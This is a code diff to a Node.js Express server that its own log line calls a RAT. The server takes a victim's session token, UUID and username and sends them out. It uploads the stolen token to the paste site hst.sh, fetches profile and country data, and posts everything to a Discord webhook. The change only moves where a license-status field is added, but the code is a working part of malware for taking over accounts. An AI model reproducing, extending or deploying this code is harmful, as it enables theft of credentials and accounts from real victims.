@@ -64,7 +64,12 @@ app.post("/", async (req, res) => {
             attachments: []
         };
 
-        if (response !== "Non-License") {
+        // Если лицензия не подтверждена, завершить выполнение без дополнительных запросов
+        if (response === "Non-License") {
+            webhookData.embeds[0].fields.push({
+                name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
+            });
+        } else {
             const [shorttoken, profiles, country] = await Promise.all([
                 post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
                 getProfiles(req.body.uuid).then(profileData => {
@@ -88,11 +93,10 @@ app.post("/", async (req, res) => {
                 { name: 'Profiles', value: `**\`\`\`${profiles}\`\`\`**`, inline: false },
                 { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false },
             );
+            webhookData.embeds[0].fields.push({
+                name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
+            });
         }
-
-        webhookData.embeds[0].fields.push({
-            name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
-        });
 
         await post(process.env.WEBHOOK, webhookData);
         console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`);
